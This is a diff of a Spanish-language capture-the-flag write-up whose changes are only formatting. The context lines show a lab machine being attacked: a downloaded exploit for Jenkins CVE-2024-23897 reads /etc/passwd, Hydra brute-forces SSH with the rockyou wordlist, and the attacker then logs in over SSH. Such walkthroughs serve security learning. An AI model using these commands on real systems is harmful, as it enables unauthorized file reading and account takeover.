@@ -60,12 +60,12 @@ del sistema (LFI)<br>
 
 Nos descargamos el exploit en python con wget de la siguiente forma
 `wget https://raw.githubusercontent.com/Praison001/CVE-2024-23897-Jenkins-Arbitrary-Read-File-Vulnerability/main/CVE-2024-23897.py` <br>, le asignamos permisos de ejecución con `chmod +x CVE-2024-23897.py`. Su uso es muy sencillo solo hay que poner la url de la página web con Jenkins y el archivo que queremos leer por lo tanto sería tal que así `python3 CVE-2024-23897.py -u http://172.17.0.2:8080/ -f /etc/passwd`. Y observamos el arhcivo de `/etc/passwd` donde podemos leer algunos usuarios como `bobby y pinguinito`.
-
 <br>
+
 ![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/081ea4f9-5afc-45e5-9375-a911c288fb91)
+<br>
+<br>
 
-<br>
-<br>
 ## Hydra / Medusa
 Una vez conocemos los posibles usuarios los metemos un archivo llamdo `users` aplicamos un ataque de fuerza fruta con hydra con el siguiente comando: `hydra -L users -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`. <br> 
 `-h` ⮞ dirección IP de la máquina victima <br>
@@ -76,14 +76,14 @@ Una vez conocemos los posibles usuarios los metemos un archivo llamdo `users` ap
 
 Nos reporta lo siguente:  
 <br>
-![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/13bb5fb7-d465-4fbe-8bde-1d49fe9f9bea)
 
+![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/13bb5fb7-d465-4fbe-8bde-1d49fe9f9bea)
+<br>
 <br>
 
 ## SSH (Puerto 22)
 Una vez conocemos el usuario y su contraseña probramos a entrar a la máquina Vacaciones con `ssh bobby@172.17.0.2`, y a continuación nos pedirá la contraseña. *Si te aparece un error como este [aquí](https://desarrolloweb.com/faq/solucionar-remote-host-identification-has-changed-al-hacer-ssh) puedes encontrar la solución.* <br>![image](https://github.com/TerrorAterrador/WriteUps/assets/128630899/2128bd5f-33a2-4bb0-ac54-6555c7aa5817)
-
-
+<br>
 <br>
 
 ## Escala de Privilegios
